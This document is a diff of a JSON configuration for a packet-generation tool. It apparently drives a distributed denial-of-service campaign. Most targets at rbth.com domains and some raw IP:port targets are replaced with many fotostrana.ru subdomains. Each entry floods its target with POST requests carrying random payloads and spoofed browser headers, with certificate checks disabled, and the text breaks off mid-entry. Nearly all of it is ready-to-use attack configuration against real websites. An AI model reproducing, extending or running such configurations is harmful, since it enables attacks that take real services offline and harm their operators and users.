@@ -8,14 +8,55 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "https://cabinet.rbth.com",
+            "count": 18,
+            "name": "http://olymp.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cabinet.rbth.com:443",
+                        "address": "olymp.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://olymp.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://olymp.fotostrana.ru",
+                                "Referer": "http://olymp.fotostrana.ru",
+                                "X-Forwarded-Host": "olymp.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://fire-ant.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "fire-ant.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -26,7 +67,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://cabinet.rbth.com",
+                            "path": "https://fire-ant.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +80,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cabinet.rbth.com",
-                                "Referer": "https://cabinet.rbth.com",
-                                "X-Forwarded-Host": "cabinet.rbth.com",
+                                "Origin": "https://fire-ant.fotostrana.ru",
+                                "Referer": "https://fire-ant.fotostrana.ru",
+                                "X-Forwarded-Host": "fire-ant.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,14 +93,55 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "https://kr.rbth.com",
+            "count": 18,
+            "name": "http://ucs.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "kr.rbth.com:443",
+                        "address": "ucs.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://ucs.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://ucs.fotostrana.ru",
+                                "Referer": "http://ucs.fotostrana.ru",
+                                "X-Forwarded-Host": "ucs.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://new-admin.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "new-admin.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -70,7 +152,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://kr.rbth.com",
+                            "path": "https://new-admin.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -83,9 +165,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://kr.rbth.com",
-                                "Referer": "https://kr.rbth.com",
-                                "X-Forwarded-Host": "kr.rbth.com",
+                                "Origin": "https://new-admin.fotostrana.ru",
+                                "Referer": "https://new-admin.fotostrana.ru",
+                                "X-Forwarded-Host": "new-admin.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -96,14 +178,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "http://mk.rbth.com",
+            "count": 18,
+            "name": "http://uc.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "mk.rbth.com:80"
+                        "address": "uc.fotostrana.ru:80"
                     }
                 },
                 "packet": {
@@ -111,7 +193,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://mk.rbth.com",
+                            "path": "http://uc.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -124,9 +206,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://mk.rbth.com",
-                                "Referer": "http://mk.rbth.com",
-                                "X-Forwarded-Host": "mk.rbth.com",
+                                "Origin": "http://uc.fotostrana.ru",
+                                "Referer": "http://uc.fotostrana.ru",
+                                "X-Forwarded-Host": "uc.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -137,14 +219,55 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "https://subscribe.rbth.com",
+            "count": 18,
+            "name": "http://chat.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "subscribe.rbth.com:443",
+                        "address": "chat.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://chat.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://chat.fotostrana.ru",
+                                "Referer": "http://chat.fotostrana.ru",
+                                "X-Forwarded-Host": "chat.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://vkdating.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vkdating.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -155,7 +278,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://subscribe.rbth.com",
+                            "path": "https://vkdating.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -168,9 +291,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://subscribe.rbth.com",
-                                "Referer": "https://subscribe.rbth.com",
-                                "X-Forwarded-Host": "subscribe.rbth.com",
+                                "Origin": "https://vkdating.fotostrana.ru",
+                                "Referer": "https://vkdating.fotostrana.ru",
+                                "X-Forwarded-Host": "vkdating.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -181,14 +304,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "http://rbth.com",
+            "count": 18,
+            "name": "http://ok.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "rbth.com:80"
+                        "address": "ok.fotostrana.ru:80"
                     }
                 },
                 "packet": {
@@ -196,7 +319,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://rbth.com",
+                            "path": "http://ok.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -209,9 +332,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://rbth.com",
-                                "Referer": "http://rbth.com",
-                                "X-Forwarded-Host": "rbth.com",
+                                "Origin": "http://ok.fotostrana.ru",
+                                "Referer": "http://ok.fotostrana.ru",
+                                "X-Forwarded-Host": "ok.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -222,14 +345,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "https://www.backend.rbth.com",
+            "count": 18,
+            "name": "https://hydra.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "www.backend.rbth.com:443",
+                        "address": "hydra.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -240,7 +363,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://www.backend.rbth.com",
+                            "path": "https://hydra.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -253,9 +376,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.backend.rbth.com",
-                                "Referer": "https://www.backend.rbth.com",
-                                "X-Forwarded-Host": "www.backend.rbth.com",
+                                "Origin": "https://hydra.fotostrana.ru",
+                                "Referer": "https://hydra.fotostrana.ru",
+                                "X-Forwarded-Host": "hydra.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -266,14 +389,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "https://social.rbth.com",
+            "count": 18,
+            "name": "https://ok.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "social.rbth.com:443",
+                        "address": "ok.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -284,7 +407,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://social.rbth.com",
+                            "path": "https://ok.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -297,9 +420,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://social.rbth.com",
-                                "Referer": "https://social.rbth.com",
-                                "X-Forwarded-Host": "social.rbth.com",
+                                "Origin": "https://ok.fotostrana.ru",
+                                "Referer": "https://ok.fotostrana.ru",
+                                "X-Forwarded-Host": "ok.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -310,55 +433,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "http://subscribe.rbth.com",
+            "count": 18,
+            "name": "https://token.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "subscribe.rbth.com:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://subscribe.rbth.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://subscribe.rbth.com",
-                                "Referer": "http://subscribe.rbth.com",
-                                "X-Forwarded-Host": "subscribe.rbth.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "https://de.rbth.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "de.rbth.com:443",
+                        "address": "token.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -369,7 +451,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://de.rbth.com",
+                            "path": "https://token.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -382,9 +464,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://de.rbth.com",
-                                "Referer": "https://de.rbth.com",
-                                "X-Forwarded-Host": "de.rbth.com",
+                                "Origin": "https://token.fotostrana.ru",
+                                "Referer": "https://token.fotostrana.ru",
+                                "X-Forwarded-Host": "token.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -395,36 +477,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "tcp://178.176.128.128:444",
+            "count": 18,
+            "name": "https://fsm.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "178.176.128.128:444"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "https://it.rbth.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "it.rbth.com:443",
+                        "address": "fsm.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -435,7 +495,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://it.rbth.com",
+                            "path": "https://fsm.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -448,9 +508,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://it.rbth.com",
-                                "Referer": "https://it.rbth.com",
-                                "X-Forwarded-Host": "it.rbth.com",
+                                "Origin": "https://fsm.fotostrana.ru",
+                                "Referer": "https://fsm.fotostrana.ru",
+                                "X-Forwarded-Host": "fsm.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -461,14 +521,137 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "https://sochi2014.rbth.com",
+            "count": 18,
+            "name": "http://fire-ant.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "sochi2014.rbth.com:443",
+                        "address": "fire-ant.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://fire-ant.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://fire-ant.fotostrana.ru",
+                                "Referer": "http://fire-ant.fotostrana.ru",
+                                "X-Forwarded-Host": "fire-ant.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "http://hydra.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "hydra.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://hydra.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://hydra.fotostrana.ru",
+                                "Referer": "http://hydra.fotostrana.ru",
+                                "X-Forwarded-Host": "hydra.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "http://music.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "music.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://music.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://music.fotostrana.ru",
+                                "Referer": "http://music.fotostrana.ru",
+                                "X-Forwarded-Host": "music.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://club.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "club.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -479,7 +662,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://sochi2014.rbth.com",
+                            "path": "https://club.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -492,9 +675,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://sochi2014.rbth.com",
-                                "Referer": "https://sochi2014.rbth.com",
-                                "X-Forwarded-Host": "sochi2014.rbth.com",
+                                "Origin": "https://club.fotostrana.ru",
+                                "Referer": "https://club.fotostrana.ru",
+                                "X-Forwarded-Host": "club.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -505,181 +688,14 @@
         },
         {
             "type": "packetgen",
-            "count": 13,
-            "name": "tcp://95.131.27.119:22",
+            "count": 18,
+            "name": "https://d-ms.fotostrana.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "95.131.27.119:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "http://www.backend.rbth.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "www.backend.rbth.com:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://www.backend.rbth.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://www.backend.rbth.com",
-                                "Referer": "http://www.backend.rbth.com",
-                                "X-Forwarded-Host": "www.backend.rbth.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "http://social.rbth.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "social.rbth.com:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://social.rbth.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://social.rbth.com",
-                                "Referer": "http://social.rbth.com",
-                                "X-Forwarded-Host": "social.rbth.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "tcp://178.176.128.128:8443",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "178.176.128.128:8443"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "http://cabinet.rbth.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "cabinet.rbth.com:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://cabinet.rbth.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://cabinet.rbth.com",
-                                "Referer": "http://cabinet.rbth.com",
-                                "X-Forwarded-Host": "cabinet.rbth.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 13,
-            "name": "https://bg.rbth.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "bg.rbth.com:443",
+                        "address": "d-ms.fotostrana.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -690,7 +706,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://bg.rbth.com",
+                            "path": "https://d-ms.fotostrana.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -703,9 +719,305 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://bg.rbth.com",
-                                "Referer": "https://bg.rbth.com",
-                                "X-Forwarded-Host": "bg.rbth.com",
+                                "Origin": "https://d-ms.fotostrana.ru",
+                                "Referer": "https://d-ms.fotostrana.ru",
+                                "X-Forwarded-Host": "d-ms.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "http://king.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "king.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://king.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://king.fotostrana.ru",
+                                "Referer": "http://king.fotostrana.ru",
+                                "X-Forwarded-Host": "king.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "http://vkdating.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vkdating.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://vkdating.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://vkdating.fotostrana.ru",
+                                "Referer": "http://vkdating.fotostrana.ru",
+                                "X-Forwarded-Host": "vkdating.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://kong.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "kong.fotostrana.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://kong.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://kong.fotostrana.ru",
+                                "Referer": "https://kong.fotostrana.ru",
+                                "X-Forwarded-Host": "kong.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
